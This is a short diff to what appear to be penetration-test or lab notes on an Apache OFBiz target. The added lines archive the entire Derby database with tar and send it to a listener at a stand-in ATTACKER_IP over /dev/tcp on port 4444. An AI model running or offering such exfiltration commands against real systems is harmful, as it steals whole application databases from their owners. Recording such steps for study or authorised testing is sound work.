@@ -16,4 +16,8 @@
 
 ## Target Machine
 
- - 
+ - cd /opt/ofbiz/runtime/data/derby
+
+ - tar cvf ofbiz.tar ofbiz
+
+ - cat ofbiz.tar > /dev/tcp/ATTACKER_IP/4444 (Compress the entire database with tar, then write all data to our listener)
